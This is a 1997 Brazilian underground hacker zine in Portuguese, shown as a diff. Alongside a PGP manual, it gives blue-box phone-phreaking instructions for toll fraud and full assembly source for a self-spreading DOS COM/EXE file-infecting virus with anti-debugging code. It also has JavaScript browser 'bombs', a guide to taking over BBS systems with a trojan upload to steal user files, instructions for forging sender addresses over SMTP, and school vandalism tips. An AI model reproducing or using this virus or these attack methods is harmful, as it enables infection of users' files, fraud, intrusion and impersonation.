@@ -1,0 +1,929 @@
+
+            ####   ##     ######## ## ####   ## #######
+          ##    ## ##          ### ## ## ##  ## ##
+          ##    ## ##        ###   ## ##  ## ## #######
+          ######## ##     ###      ## ##   #### ##
+          ##    ## ###### ######## ## ##    ### #######
+          <Allansoft zine: The underground brazilian zine>
+
+
+Alzine - revista mensal ( todos dia 01 nos melhores sites underground
+do Brasil).
+
+   
+Alzine, 01 de Dezembro de 1997
+
+#######################################################################
+
+Pois eh gente... Chegou essa merda... depois de 1 mez de espera.
+Bom, esse mez, o zine ateh que tah legal... Mas não vai se comparar
+ao zine de 01 de Janeiro de 1998! Que (eu espero) vai estah um T!
+Hoje eh dia 16 e eu to começando a escrever o zine, e espero conseguir
+matéria suficiente para botar no zine numbah 04...
+Então aki começa o Allansoft zine numbah 04!!!
+
+PS: Para melhor visualização deste documento sugiro o uso de olhos!
+Se você for um LAMER (Ex: Gabrieldov), aperte as teclas "Alt+F4"
+}---------------------------------------------------------------------{
+INDICE:
+1-Manual do PGP
+2-Manual do BlueBeep
+3-Virus
+4-JavaScript Bombs
+5-Hackeando RA
+6-Fake Mail
+7-Anarchy
+8-Humor
+}---------------------------------------------------------------------{
+
+#######################################################################
+####################Aperte Page Down para continuar####################
+#######################################################################
+
+1-Manual do PGP
+
+Esse manual foi feito pelo Stremer e nao pode ser modificado...
+
+[+]======================== Manual do PGP ========================[+]
+
+  I- Como criar um Chave     
+ II- Como adcionar uma chave a seu CHAVEIRO 
+III- Enviando uma msg em PGP
+ IV- Recebendo uma msg em PGP
+
+
+
+                 [+]--------------------[+]
+                  |           I          |
+                  |----------------------|
+
+    Para criar um chave digite o seguinte comando:
+
+    pgp -kg
+
+    Vai aparecer na tela 3 opcoes Ok! Escolha a terceira "1024 bits".
+    Depois coloque seu nick e e-mail juntos como no exemplo abaixo:
+
+    Nick <nick@shc.com>
+
+    Logo depois entre com uma SENHA e confirme logo apos ....
+    Apos ele vai querer que vc digite qualquer coisa no teclado para formar
+sua chave Ok! Digite varios numeros e letras sai digitando ate acabar. Logo
+apos ele comeca a gerar a chave.
+
+    Pronto vc ja criou sua chave, mais agora tem que passar ela para 'ascii'
+ou seja em forma de um TXT para enviar em seu e-mail para divulgar sua chave
+a outros usuarios que possuem PGP.
+
+    Digite:
+
+    pgp -kxa nick pubring.pgp
+
+    O programa vai criar um arquivo chamado 'pubring.asc' Ok!
+    Edite o arquivo e vai ver sua chave la contida...
+    Agora e so enviar ela por e-mail para seus amigos !! hehe...
+
+    No final deste texto vai encontrar minha chave publica Ok!
+
+
+                 [+]--------------------[+]
+                  |           II         |
+                  |----------------------|
+
+    Quando seu amigo enviar a chave dele por e-mail corte esta parte :
+
+    CORTE AQUI:
+    ---BEGIN ...
+    rwyruwyuyuiyruiwytweryuty2523789
+    qruqwtiutiou287238
+    qwijurtwiu2958295 bla bla bla bla tal etc...
+    -----END PGP PUBLIC KEY BLOCK-----
+    FIM DO CORTE
+
+    e grave isto num arquivo que vai se chamar 'nome.asc' OK!
+    Depois para adcionar a seu chaveiro digite:
+
+    pgp nome.asc
+
+    o PGP vai fazer varias perguntas e responda "Y" para todas Ok!
+    E pronto a chave dele foi adcionada a seu chaveiro Ok!
+
+                 [+]--------------------[+]
+                  |           III        |
+                  |----------------------|
+                                                
+    Para enviar um msg texto e-mail e pgp primeiro edite um arquivo TXT
+e escreva seu texto, msg e salve com 'nome.txt', e apos digite:
+
+    pgp -ea qualquer_nome.txt "digite aqui o nick da pessoa corretamente!"
+
+    e pronto o pgp vai criar um arquivo chamado 'qualquer_nome.asc', coloque
+este arquivo dentro do seu e-mail que vai enviar!!
+
+                 [+]--------------------[+]
+                  |           IV         |
+                  |----------------------|
+
+    Como ler um msg em pgp ....
+    Quando receber um e-mail com a msg toda em pgp copie a parte da msg em
+pgp e salve dentro de um arquivo 'qualquer_nome.asc' Ok!
+    Depois para ler digite :
+
+    pgp 'nome do arquivo.asc'
+
+    Ai ele cria um arquivo normal, ele avisa qual o nome e extensao...
+    E depois e so dar um edit no arquivo e ler a msg !!!
+
+     PRONTO !! PGP SEM MISTERIOS GALERA !!!
+     HEHEHE
+
+#######################################################################
+####################Aperte Page Down para continuar####################
+#######################################################################
+
+2-Manual do BlueBeep
+
+Primeiramente...possua um Trunk funcional.
+Ex: O Trunk da Costa Rica ! " Funcional mais Inutil"
+Voce se pergunta..pq inutil ????
+Eu respondo : Pq nao ha quase sistemas bons neste pais, e o o sistema de
+chamadas internacionais deste pais e' voltado totalmente por liberacao
+via Operadores !!!
+
+Mas voltando em como usar o BlueeBeep, faca assim:
+
+1o. Pegue o software BlueBeep Versao 0.10 encontrado em quase qualquer
+sistema e descompacte.
+2o. Logicamente apos a verificacao se o mesmo software nao e' um trojan, ou
+um arquivo infectado, va para o menu, e coloque em :
+
+Setup -> Edit Trunk
+
+Agora voce pode visualizar varios campos escritos :"-Unused-"
+Vendo isso vc percebera que nao ha nenhum Trunk definido. Se o mesmo
+possuir alguma coisa, nao perca tempo... confira o codigo do pais,e teste !
+Mas se todos os campos estiverem vazios, ou seja, escritos "-Unused-",
+faca o seguinte:
+
+ ---------------------------------------------------------------------------
+|  Setup           Tools           PHREAK OUT!     Info            Quit     |
+ ---------------------------------------------------------------------------
+ ------------
+|  Dinamar.  |                    
+|> CoST/RiC <|
+|  HongKong  |
+|  Teste3    |    ---------------  -----------------------------------------
+|  Franca G  |   |> Name        <||   CoST/RiC                              |
+|  Dina2     |   |  Description  ||   Costa Rica                            |
+|  Portugal  |   |  Tone #01     ||   2460    2660        0      151     11 |
+|  Africa    |   |  Tone #02     ||   2460       0        0      151      0 |
+|  Espanha   |   |  Tone #03     ||      0       0        0        0      0 |
+|  Portu2    |   |  Tone #04     ||      0       0        0        0      0 |
+|  -Unused-  |   |  Tone #05     ||      0       0        0        0      0 |
+|  -Unused-  |   |  Tone #06     ||      0       0        0        0      0 |
+|  -Unused-  |   |  Tone #07     ||      0       0        0        0      0 |
+|  -Unused-  |   |  Tone #08     ||      0       0        0        0      0 |
+|  -Unused-  |   |  Tone #09     ||      0       0        0        0      0 |
+|  -Unused-  |   |  Tone #10     ||      0       0        0        0      0 |
+|  -Unused-  |   |  Play trunk   ||                                         |
+|  -Unused-  |    ---------------  --Freq1---Freq2----Freq3----Length--Pause-
+|  -Unused-  |re Onkel Dittmeyer " release - Check docs for details.
+
+Configure todos seus campos, com exemplo na figura acima.
+Nota: O Trunk definido como exemplo funciona.
+
+Depois de ter configurado todos seus campos, va para :
+
+PHREAK OUT! --> ACTION MODE
+
+Apos ter feito isso, devera aparecer nesta tela :
+
+ --------------------------- BlueBEEP! Action Mode -------------------------
+| Current trunk: CoST/RiC                                  Local Time: 01:43|
+ ---------------------------------------------------------------------------
+ ---------------------------------------------------------------------------
+|  1  |  2  |  3  | KP1 | KP2 | ST | KP2E | STE | C11 | C12 | EO |  | BREAK |
+|-----|-----|-----|--A-----B----C-----D------E-----F-----G----H---  --- + --|
+|  4  |  5  |  6  |                                                         |
+|-----|-----|-----| M/S: 0.70x       Xlat: OFF            Dial Set: CCITT-5 |
+|  7  |  8  |  9  |                                                         |
+|-----|-----|-----| [F1] Trunk        [] Dial Speed    [F10] Blast Exit   |
+|  *  |  0  |  #  | [F2] Dial Set     [CR] Send Number   [SPC] Edit Number  |
+|---------------------------------------------------------------------------|
+|Device Status: ON-HOOK   PLAY   REC   PHONE   DIAL      NONE   REC   PHONE |
+|Dialer Status: Welcome to BlueBEEP V0.10á-"Ready To Rock, Commander Data?" |
+ ---------------------------------------------------------------------------
+160  Cibernerd                             AA75655888C             ???
+161  Costa Rica                            AA2317978C              ???
+162  Costa Rica                            AA2533119C              ???
+163  Costa Rica                            A2366606C               ???
+164  Gabriela Mendez -=Costa Rica=- Fax    AA2266034C              ???
+165  Costa Rica                            AA4424155C              ???
+166  Costa Rica                            AA2579566C              ???
+167  Politecnica Virus                     A0119535414C            ???
+
+
+
+Verifique pela tela acima se seu BlueBeep esta configurado de acordo...
+Se nao estiver configure com as opcoes expressas no mesmo.
+
+Nota: So' use os telefones que indiquem " Costa Rica" os outros nao
+funcionarao.
+
+Para liberar o Trunk pressione "+" que normalmente fica no teclado numerico
+do lado direito dos eu teclado. Fazendo isso a nivel de teste para saber se
+o TON esta sendo tocado e deve estar saindo de suas caixas acusticas !
+
+Nota: Este programa so' funciona com maquinas que possuam placa de som,
+mesmo que a placa seja uma Adlib.
+
+Apos isso, pegue seu telefone do gancho e disque este numero:
+000-80-50
+
+Nao seu preocupe pois esta ligacao nao e' cobrada...
+Escute o telefone tocando, e assim que o operador atender, coloque o gancho
+do fone perto das caixas acusticas, e solte o Trunk, teclando "+", do
+teclado numerico !!!
+De preferencia, fique com a caixa acustica a mao,segurando a mesma no bocal
+do fone, mantendo o fone em seu ouvido... e preste atencao na quebra do
+Trunk... vc devera escutar uma sequencia de um bip alto e dois baixos,
+apos isso ficara mudo, em seguida solte o numero do telefone e se vc
+perceber que ira connectar, va para seu programa de comunicacao...
+
+#######################################################################
+####################Aperte Page Down para continuar####################
+#######################################################################
+
+
+3-Virus
+
+Esse virus foi o virus mais difícil que eu já fiz na minha vida... Demorei 5 dias para acabar ele...
+Eu editei ele em Assembler e realmente foi muito chato... Legal mesmo eh o efeito...
+Portanto, ai está o virus, e espero que vcs aproveitem...
+
+; Autor : LamaHunter 
+; Local de Criacao : Nem te conto...
+; Estilo : Path Loader EXE , COM Infector e COMMAND.COM
+; Tecnicas Ant- : TBAV 7.0, F-PROT 225, SCAN?? ISSO E ANT-VIRUS? HAHA! 
+; Data de Criacao : 5/11/97
+; Use o TASM 3.0 para compilar!
+
+;A
+VACA            equ     0AFCFh
+;e o
+FRANGO          equ     056ACh
+
+code            segment
+                org     100h
+                assume  cs:code,ds:code,es:code
+
+start:
+                db      0E9h,3,0         
+host:
+                db      0CDh,20h,0       
+virus_begin:
+                call    $ + 3            
+                pop     bp
+                sub     bp,offset $ - 1
+                int     3
+
+                push    ds es
+
+                cli
+                mov     ax,VACA          
+                push    ax
+                pop     ax
+                dec     sp
+                dec     sp
+                pop     bx
+                cmp     ax,bx
+                je      no_trace
+                hlt
+
+no_trace:
+                sti
+                in      al,21h           
+                xor     al,2
+                out     21h,al
+                xor     al,2
+                out     21h,al
+
+                push    cs
+                pop     ds
+                lea     dx,[bp + offset new_DTA]
+                mov     ah,1Ah
+                int     21h
+
+                push    [bp + exe_cs]
+                push    [bp + exe_ip]
+                push    [bp + exe_ss]
+                push    [bp + exe_sp]
+                call    traverse
+
+                call    activate
+
+                pop     [bp + exe_sp]
+                pop     [bp + exe_ss]
+                pop     [bp + exe_ip]
+                pop     [bp + exe_cs]
+                pop     es ds
+                mov     dx,80h
+                mov     ah,1Ah
+                int     21h
+
+                cmp     sp,FRANGO               
+                je      exe_exit
+
+
+
+com_exit:
+                lea     si,[bp + host]          
+                mov     di,100h
+                push    di
+                movsw
+                movsb
+
+                call    fix_regs                
+                ret                             
+exe_exit:
+                mov     ax,ds                   
+                add     ax,10h
+                push    ax
+                add     ax,cs:[bp + exe_cs]
+                mov     cs:[bp + return_cs],ax
+
+                mov     ax,cs:[bp + exe_ip]
+                mov     cs:[bp + return_ip],ax
+
+                pop     ax
+                add     ax,cs:[bp + exe_ss]       
+                cli
+                mov     ss,ax
+                mov     sp,cs:[bp + exe_sp]
+
+                call    fix_regs                
+                sti
+
+                db      0EAh                    
+return_ip       dw      0
+return_cs       dw      0
+
+exe_cs          dw      -16                     
+exe_ip          dw      103h
+exe_sp          dw      -2                      
+exe_ss          dw      -16
+
+
+fix_regs:
+                xor     ax,ax
+                cwd
+                xor     bx,bx
+                mov     si,100h
+                call     cu
+
+cu:
+                xor     di,di
+                xor     bp,bp
+                ret
+
+
+traverse:
+                sub     sp,64                   
+                mov     si,sp
+                inc     si
+                mov     ah,47h                  
+                xor     dl,dl
+                push    ds
+                push    ss
+                pop     ds
+                int     21h
+
+                pop     ds
+                dec     si
+                mov     byte ptr ss:[si],'\' 
+
+next_dir:
+                call    infect_dir
+
+                lea     dx,[bp + outer]       
+                mov     ah,3Bh
+                int     21h
+                jnc     next_dir
+
+traverse_done:
+                add     sp,64                 
+                mov     dx,si
+                push    ds
+                push    ss
+                pop     ds
+                mov     ah,3Bh
+                int     21h
+                pop     ds
+                ret
+
+infect_dir:
+                mov     ah,4Eh
+                inc     byte ptr [bp + offset find_me]
+                lea     dx,[bp + find_me]
+                int     21h
+                dec     byte ptr [bp + offset find_me]
+                jc      infect_done
+
+next_file:
+                lea     dx,[bp + new_DTA + 1Eh]
+                call    file_open
+                mov     ah,4Fh
+                int     21h
+                jnc     next_file
+
+infect_done:
+                ret
+
+file_open:
+                push    ax cx di es
+                call    get_extension
+                cmp     [di],'OC'             
+                jne     perhaps_exe             
+                cmp     byte ptr [di + 2],'M'
+                jne     not_prog
+                jmp     a_program
+perhaps_exe:
+                cmp     [di],'XE'               
+                jne     not_prog
+                cmp     byte ptr [di + 2],'E'
+                jne     not_prog
+a_program:
+                pop     es di cx ax
+                jmp     execute                 
+not_prog:
+                pop     es di cx ax
+                ret
+
+execute:
+                push    si
+
+                xor     ax,ax                   
+                mov     es,ax                   
+                lea     ax,[bp + int_24]
+                mov     es:[24h * 4],ax
+                mov     es:[24h * 4 + 2],cs
+
+                mov     ax,4300h                
+                inc     al
+                int     21h
+
+                push    cx dx ds
+                xor     cx,cx
+                call    set_attributes
+
+                mov     ax,3D02h                
+                int     21h
+                jc      cant_open
+                xchg    bx,ax
+
+                mov     ax,5700h                
+                inc     al
+                int     21h
+                push    cx dx
+                mov     ah,3Fh
+                mov     cx,28
+                lea     dx,[bp + read_buffer]
+                int     21h
+
+                cmp     byte ptr [bp + read_buffer],'M'
+                je      infect_exe              
+
+                mov     al,2                    
+                call    move_file_ptr
+
+                sub     dx,VIRUS_SIZE + 3       
+                cmp     dx,word ptr [bp + read_buffer + 1]
+                je      dont_infect
+
+                add     dx,VIRUS_SIZE + 3
+                mov     word ptr [bp + new_jump + 1],dx
+
+                lea     dx,[bp + read_buffer]  
+                int     21h
+                mov     ah,40h                 
+                mov     cx,VIRUS_SIZE
+                lea     dx,[bp + virus_begin]
+                int     21h
+
+                xor     al,al                  
+                call    move_file_ptr
+
+                lea     dx,[bp + new_jump]
+                int     21h
+
+fix_date_time:
+                pop     dx cx
+                mov     ax,5700h               
+                inc     al
+                int     21h
+
+close:
+                pop     ds dx cx               
+                call    set_attributes
+
+                mov     ah,3Eh                 
+                int     21h
+
+cant_open:
+                pop     si
+                ret
+
+
+set_attributes:
+                mov     ax,4300h
+                inc     al
+                int     21h
+                ret
+
+dont_infect:
+                pop     cx dx                  
+                jmp     close
+
+
+
+move_file_ptr:
+                mov     ah,42h                 
+                cwd
+                xor     cx,cx
+                int     21h
+
+                mov     dx,ax                  
+                mov     ah,40h                 
+                mov     cx,3
+                ret
+infect_exe:
+                cmp     word ptr [bp + read_buffer + 26],0
+                jne     dont_infect            
+
+                cmp     word ptr [bp + read_buffer + 16],FRANGO
+                je      dont_infect            
+
+                les    ax,dword ptr [bp + read_buffer + 20]
+                mov    [bp + exe_cs],es
+                mov    [bp + exe_ip],ax
+                les    ax,dword ptr [bp + read_buffer + 14]
+                mov    [bp + exe_ss],ax
+                mov    [bp + exe_sp],es
+                mov    word ptr [bp + read_buffer + 16],FRANGO
+                mov     ax,4202h               
+                cwd
+                xor     cx,cx
+                int     21h
+
+                push    ax dx                  
+
+                push    bx
+                mov     cl,12                  
+                shl     dx,cl                  
+                mov     bx,ax
+                mov     cl,4
+                shr     bx,cl
+                add     dx,bx
+                and     ax,15
+                pop     bx
+
+                sub    dx,word ptr [bp + read_buffer + 8]
+                mov    word ptr [bp + read_buffer + 22],dx
+                mov    word ptr [bp + read_buffer + 20],ax
+                add    dx,100h
+                mov    word ptr [bp + read_buffer + 14],dx
+
+                pop     dx ax                  
+
+                add     ax,VIRUS_SIZE + 3
+                adc     dx,0
+                mov     cx,512                 
+                div     cx                     
+                inc     ax
+                mov     word ptr [bp + read_buffer + 2],dx
+                mov     word ptr [bp + read_buffer + 4],ax
+
+                mov     ah,40h
+                mov     cx,VIRUS_SIZE + 3
+                lea     dx,[bp + virus_begin]
+                int     21h
+
+
+                mov     ax,4200h               
+                cwd
+                xor     cx,cx
+                int     21h
+
+                mov     ah,40h                 
+                mov     cx,28
+                lea     dx,[bp + read_buffer]
+                int     21h
+                jmp     fix_date_time          
+
+activate:
+                
+        mov     ah,2ah
+        call    int21
+        cmp     cx,1997                        
+        jb      dont_activate                  
+        cmp     dh,05                            
+        jne     dont_activate
+        cmp     dl,19                            
+        jne     dont_activate
+     
+        mov     ah,9                             
+        lea     dx,[bp+messege]                  
+        int     21h
+     
+        mov     cx,52
+        include .\phasor.rtn    ;Voce vai prescisar disso para compilar!
+
+Int21:
+        int     21h
+        ret
+dont_activate:
+ret
+messege: 
+db" ÜÜÜ        ÛÛ²     ² ÜÜÛÛ   Ûß±   Û²  ÛÛ²  ÛÛ ÛÛÛ    Û    ÛÛ     ÜÜÛÛ   ",13,10
+db"±Üß ÛÜ     ²ÛÛ±     ²Û   ß  ²ÛÛ°   Û± ²ÞÛ± ²ÛÛ ± ÛÛ²  ÛÛ  ²ßÛ± ± ß   ±   ",13,10
+db"±ÛÛ  ßÛÜ   ±ÛÛ°     ±Û Û     ²ßÜ  Û±° ± Û± ²ÛÛ °ÜÛ ± ²ÛÛ  ±ÛÛ° ° ²ÛÛÜ    ",13,10
+db"°ÜÛÜÜÜÜÛÛ  ±Û °     ±²Û  Ü    ±ÛÛ Û°° °Þ ° ±ÜÛßßÛÜ   ²²Û  °ÛÛ°   ±   Ü   ",13,10
+db" ²Û   ²ÛÛ± °ÜÛÛÛÛÛ± °±ÛÛÛÛ±    ±ßÛ °  °ÞÛ° °ÛÛ² ±ÛÛ± ±±ÛÛÛÜß²  ²ÛÛÛÜÜß±± ",13,10
+db" ±±   ²±Û° ° ±°²  ° °° ±° °    ° Þ °  °²   ° ±² °±²° °±²± ± ±  ± ±²± ± ° ",13,10
+db"  ±   ±± ° ° ° ±  °  ° °  °    ° °°    ± °   °± ° ±° °°±° ° °  ° °±  ° ° ",13,10
+db"  °   ±      ° °       °         °°    ± °   °°   °   °°° ° °  °  °  °   ",13,10
+db"      °  °     °  °    °  °       °    °      °         °            °   ",13,10
+db" ÜÛÜ  Ü    ²ÛÜÜÛÛ    ÛÛ ÛÛÛ    ÛÛ²  ÛÜ Ü        ÜÛÛÛÛ    ÜÜÜ             ",13,10
+db"² Ûß ßÛ   ²ÛÛ±  ÛÛ² ²ÛÛ ± ÛÛ² ²ÞÛ±  ÛÛ ßÛ   Û   ÛÛ± ßÛ± ±Üß ÛÜ           ",13,10
+db"±²Û    Ü  ±ÛÛ°  ÛÛ± ²ÛÛ °ÜÛ ± ± Û± ²ÛÛ  ßÛ ÛÛ± ± Ü°ÜÜÜ° ±ÛÛ  ßÛÜ         ",13,10
+db"±±±Ü Ü  ± ±ÛÛ  Üß±° ±ÜÛßßÛÜ   °Þ ° ²ÛÛ±  Þ ÛÛ± °²Û  ÛÛ² °ÜÛÜÜÜÜÛÛ        ",13,10
+db"± ±   ß ° ° Ûßß ²±° °ÛÛ² ±ÛÛ± °ÞÛ° ±ÛÛ°   ²ÛÛ° °±±ÛÛÛß±  ²Û   ²ÛÛ±       ",13,10
+db"° °± ²  ° ° ±°²°²°  ° ±² °±²° °²   ° ±°   ± ²   °±   ±   ±±   ²±Û°       ",13,10
+db"  °  ±      ° ± ±°    °± ° ±°  ± ° ° °°   ° ±°   °   °    ±   ±± °       ",13,10
+db"                                                                         ",13,10
+db"Alevirus 97 !!!!!!!!!!! Call Now ???-???? many files from virii service  ",13,10
+db"     Sao Caetano do Sul       ÚÄCÄ¿ÚÄOÄ¿ÚÄRÄ¿ÚÄIÄ¿ÚÄNÄ¿ÚÄGÄ¿ÚÄAÄ¿Brasil! ",13,10
+db"Ligue Para esta Puta: Viviane ³ 2 ³³ 1 ³³ 5 ³³ 1 ³³ 9 ³³ ? ³³ ? ³Brasil! ",13,10
+db" Aberto das 0:00 ate 6:00 A.M ÀÄÄÄÙÀÄÄÄÙÀÄBÄÙÀÄBÄÙÀÄZÄÙÀÄÄÄÙÀÄÄÄÙBrasil! ",13,10,"$"
+
+
+
+get_extension:
+                push    ds          
+                pop     es
+                mov     di,dx
+                mov     cx,64
+                mov     al,'.'
+                repnz   scasb
+                ret
+
+
+find_me         db      ').*',0
+outer           db      '..',0
+
+int_24:
+                mov     al,3        
+                iret
+new_jump        db      0E9h,0,0
+
+infections      db      0
+virus_end:
+VIRUS_SIZE      equ     virus_end - virus_begin
+read_buffer     db      28 dup (?)             
+new_DTA         db      128 dup(?)
+
+end_heap:
+
+MEM_SIZE        equ     end_heap - start
+
+code            ends
+                end     start
+
+#######################################################################
+####################Aperte Page Down para continuar####################
+#######################################################################
+
+4-JavaScript Bombs
+
+Aki botei fontes de scripts para mandar em CHAT ou em Home Pages...
+
+1-Essa bomba simula um virus...
+----------------------------------------------------------------------------
+
+<SCRIPT LANGUAGE="JavaScript">
+
+function ConfirmClose() {
+        alert("Error: 107x has ocurred. The Virus: 'Di Vinchi' has been
+        detected on Drive C. pleasy erase ALL infected files.")
+        if (confirm("Pleasy inform the the hardware vendor of this error."))
+                  alert('The virus has been contained, to fully recover the
+                  browser will shutdown');
+        else
+
+                  alert('The problem has not been fixed, the browser will
+                  shut downto prevent further contamination.')
+       {
+       window.close()
+       }
+}
+</SCRIPT>
+----------------------------------------------------------------------------
+2-Abre 30 janelas do Netscape...
+----------------------------------------------------------------------------
+
+<SCRIPT LANGUAGE="JavaScript">
+
+Function WindowBomb()
+{
+   var iCounter = 0  //  dummy counter
+
+   while (true)
+     {
+       window.open("http://www.netscape.com","CRASHING" + iCounter, "whidth=1,
+       height=1,resizable=no")
+       iCounter++
+     }
+}
+</SCRIPT>
+----------------------------------------------------------------------------
+3-Mensagem permanente...
+----------------------------------------------------------------------------
+<SCRIPT LANGUAGE="JavaScript">
+
+Function AnnoyingButton()
+{
+   while (true)
+      window.alert("Vai a Merda")
+}
+</SCRIPT>
+----------------------------------------------------------------------------
+#######################################################################
+####################Aperte Page Down para continuar####################
+#######################################################################
+
+5-Hackeando RA
+
+1 - Introducao.
+
+     A pergunta que todos nos fazemos um ao outro, como se hackeia um BBS??
+     e quais as possibilidades de obter sucesso?, pois e', por essa questao
+     resolvi citar algumas de minha manhas que muitas vezes funcinaram, nes
+     te caso, citarei a forma mais facil e simples de se hackear um BBS em
+     sistema REMOTE ACCESS.
+
+
+
+
+ 2 - Como hackear o BBS?
+
+     Bom, a principio, voce deve encontrar um BBS em RA, que estaja iniciando
+     e nao conheca as manhas necessarias para garantir a seguranca contra ha-
+     ckers e cyberpunks, desta forma, voce deve persuadir ao SysOP ( que  nao
+     conhece nada ainda) a disponibilizar o protocolo PUMA/Mpt (protocolo que
+     esta disponivel no Eco-Net BBS), desta forma, quando o SysOp ja  estiver
+     instalado o Protocolo, todo feliz e contente, voce conecta ao BBS dele e
+     quando ele estiver dormindo (‚ claro!) atravez do TERMiNATE x.xx e pres-
+     siona "SCROLL Lock" (Door Way Mode) e comeca tranquilamente a transferir
+     um arquivo qualquer, no meio da transferencia, vem a surpreza! pressione
+     ALT-A (ou CTRl-A nao me lembro ao certo) e ele simplesmente cair  para o
+     DOS do Cara em Remote Mode! tendo acesso total a todos os dados do infe-
+     iz! Podendo roubar o USERS.BBS e tranquilamente ter acesso de  todos  os
+     usuarios desejados, mais ai, voce me pergunta: "O RA tem uma protecao  e
+     nao permite que o SYSOP visualize as senhas dos usuarios,desta forma nao
+     tem jeito de usar a senha de outros usuarios registrados, como faria en-
+     t„o??? e eu, grande conhecedor no assunto (HEHE) respondo: Nao Conferen-
+     cia HACKERS (N§ 10) esta disponivel um arquivo chamado: "RAPWD.ARJ"  que
+     acha a senha dos usuarios no RA!!! e entao, podera entrar com o nome  do
+     sysop, dos usuarios registrados (todos) e muito mais! alem de, se quiser
+     danificar varios arquivos do BBS! mas, pense bem, o Coitado do Sysop de-
+     morou muito tempo, e gastou muita forca de vontade para construir um BBS
+     para que em poucos segundos, voce destrua-a, portanto,  seria uma enorme
+     sacanagem formatar o HD do cara, faca qualquer coisa, roube arquivos,de-
+     ixe mensagens, tire sarro, mas nao Formate nada! posso lhe garantir  que
+     vai ser muito mais divertido...
+
+
+ 3 - E se o Sysop for uma MULA e nao souber e/ou quiser instalar o PUMA/Mpt??
+
+     Caso o sysop nao queira de forma alguma instalar o PUMA/Mpt ou nao tenha
+     neuronios suficientes para conseguir configura-lo, e simples, de um help
+     para ele! construa um Trojan (bem simples)  com uma tela de apresentacao
+     bem convincente, e faca um UPLOAD, ao iniciar a descricao do arquivo,vo-
+     ce a faz com uma grande inspiracao, deixando dessa forma o "Pobre" Sysop
+     curioso, louco para "rodar" o upload feito por voce, logo que roda-lo  o
+     Trojan (voce deve saber que o trojan ira copiar o PUMA para o  diretorio
+     do Remote AcCess, e substituir o arquivo de protocolos por  um  identico
+     e incluido do PUMA)  e o trojan executara a funcao em parentezes,  assim
+     voce estara dando um "Empurraozinho para o sysop, desta forma o Puma/Mpt
+     sera instalado a forca no RA! e podera iniciar o processo do citado a uma
+     pagina acima!!!!.
+
+
+
+ 4 - E se apos tudo isso, o processo nao funcionar????
+
+     Caso voce, ao tentar executar a instrucao nao obtenha resposta ao Comando
+     ALT-A, tem ainda uma segunda e ultima chance: IMPLORAR para o  Sysop  lhe
+     dar um nivel de SYSOP para matar suas lumbrigaS!!!! :)))))
+
+
+#######################################################################
+####################Aperte Page Down para continuar####################
+#######################################################################
+
+6-Fake Mail
+
+Esse artigo foi mandado por um amigo meu do ICQ, o ¥=||CaRRaScO||=¥, por falar nisso, o UIN da Allansoft eh: 2246671, qqer coisa pode nos contatar...
+Valeu ¥=||CaRRaScO||=¥!!
+
+Por:Carrasco
+E-mail:mcarbone@mandic.com.br
+ICQ UIN: 1200889
+
+Aqui mostro como mandar um FAKE-MAIL via Telnet para aqueles que ainda não sabem.
+Bom, como todos tem conhecimento(eu acho) via Telnet voce conecta diretamente a um sistema remoto e assim, voce pode interagir com o servidor por via de comandos....esse tipo de coisa. 
+Então, o interessante é que voce pode fazer isso se conectando ao servidor de e-mail 
+do seu provedor!
+
+Bom, siga os passos abaixo:
+
+1.Conecte via telnet ao seu servidor SMTP usando a porta 25 (característica de servidores SMTP)
+
+2.Ao conectar você verá provavelmente que o servidor está usando um prog. chamado SENDMAIL ou algo assim...Bem, digite a palavra HELO(uma espécie de reconhecimento) e dê um ENTER
+
+3.Primeiro, voce tem que especificar o e-mail do Remetente. É nesse campo que voce pode anonimar seu endereço e mandar um mail sem ninguém saiba quem voce realmente é... Para isso, digite na tela do terminal:
+
+MAIL FROM:<o e-mail que voce quiser como remetente> 
+E digite ENTER. Depois especifique o destinatário digitando:
+RCPT TO:<o e-mail da pessoa que vai receber>
+E digite ENTER. Agora digite a mensagem que quiser no e-mail. Digite em maiúsculas:
+DATA
+De ENTER. dai o bixim vai falar pro ce digitar sua msg e quando terminar, dar um ENTER, digitar a tecla do . e dar denovo um ENTER. pronto! Voce mandou!
+
+Agora, quais são as utilidades disso? Bom, voce pode dizer que mandou um e-mail sem usar nenhum Eudora ou Outlook de merda ainda por cima, via telnet e se quiser ainda, ANONIMO!
+
+(Esse texto nao foi modificado em respeito ao dito cujo autor)
+#######################################################################
+####################Aperte Page Down para continuar####################
+#######################################################################
+
+
+7-Anarchy
+
+Se voce quiser fuder com sua escola:
+
+Se as cordinhas da Patente da sua escola ainda estiverem inteira, 
+queime-as com um isqueiro ou coisa parecida.
+
+Se nao tiver um furo na caixa da patente faca um. (e claro que se for de 
+plastico.
+
+Pege e roube um gis do professor antes do recreio, e na hora do recreio 
+pinte no quadro atras da classe do professor um chifre !!!!
+(mas voce tera que ver mais ou menos fica melhor) com a altura e coisa do professor. Quem for esperto consegue direitinho. Fica muito animal.
+
+quando todo mundo sair da sala na hora do recreio, pege e tire o pininho 
+do trinco da porta, troque as partes do trinco, coloque a que nao tem aquele cabinho de ferro para dentro e a outra para fora. 
+ai quando o professor ou aquele aluno muito mane for entrar fica com o 
+trinco na mao e se perde um tempao de aula.
+
+Sua escola tem cortinas ?? Corteas ou grude um chiclesao nelas.
+
+Coloque aquelas colas com porpurinha entre o espacinho no meio do trinco 
+da porta quando bater para trocar de professor, e feche a sala. O professor mete o maosao la e fica todo melecado.
+
+Isso ai mes que vem tem mais dicas de anarchy !
+(texto retirado de QS)
+
+#######################################################################
+####################Aperte Page Down para continuar####################
+#######################################################################
+
+8-Humor
+
+Esse texto foi mandado por um amigo meu, o Ring, por isso não o modifiquem, nem coisa e tal, pq o moleque tem 2,15m de altura e da porrada em todo lamer folgado... Valeu ring.
+(leia com atenção!)
+
+Neste estabelecimento moderno e de luxo, encontra-se pu-
+blicamente em exposicao as mais lindas e confortaveis bo-
+tas baixas, altas e apertadas, por preco de ocasiao. Sa-
+patos de verniz, camurca, ultimos modelos. Piteiras ameri-
+canas, bonitas e elegantes, finas e especialmente para fu-
+mar em saloes, bares e cafes elegantes. Estamos a ven-
+der desde R$ 1,00. Nossa especialidade exclusiva em cu-
+ecas, camisetas, lencos e blusoes.
+De mocinhas a rapazes de 14 anos, a partir de R$ 0,50. Pu-
+xadores, travessas nacionais e estrangeiras. Jogos de mon-
+taria completa, para diversos precos. Temos lindos ca-
+nivetes, artigos de papelaria, canetas cartinagens, ba-
+ralhos de diversos tipos e tamanhos, bem como umas bo-
+necas de veludo e pele de raposa. Fios, trancas e tran-
+cetas especiais, chegadas diretamente de Paris.
+
+Se voce chegou ao final desse anuncio e nao se interessou
